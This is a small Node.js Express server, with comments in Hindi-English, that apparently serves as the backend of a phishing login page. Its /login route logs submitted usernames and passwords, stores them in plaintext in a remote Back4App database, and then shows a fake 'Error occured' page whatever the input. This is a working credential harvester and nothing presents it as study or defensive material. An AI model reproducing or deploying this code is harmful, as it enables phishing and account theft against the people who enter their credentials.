const express = require("express");
const Parse = require("parse/node");
require("dotenv").config();

// Parse initialize karo
Parse.initialize(process.env.BACK4APP_APP_ID, process.env.BACK4APP_JS_KEY);
Parse.serverURL = process.env.BACK4APP_SERVER_URL;

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  console.log(req.body);

  if (!username || !password) {
    return res.status(400).send("Username aur password dono zaroori hain.");
  }

  try {
    // Naya Parse Object class "UserData" mein save karo
    const UserData = Parse.Object.extend("UserData");
    const entry = new UserData();

    entry.set("username", username);
    entry.set("password", password);

    await entry.save();

    console.log("Back4App mein save ho gaya:", entry.id);

    res.redirect(`/data?username=${encodeURIComponent(username)}`);
  } catch (error) {
    console.error("Save error:", error);
    res.status(500).send("Database mein save nahi ho saka.");
  }
});

app.get("/data", (req, res) => {
  const { username } = req.query;
  res.send(`
    <html>
      <head><title>Data</title></head>
      <body style="background:#111; padding:20px;">
        <h1 style="color:#fff;">Error occured</h1>
      </body>
    </html>
  `);
});

app.listen(3000, () => console.log("Server chal raha hai port 3000 par"));

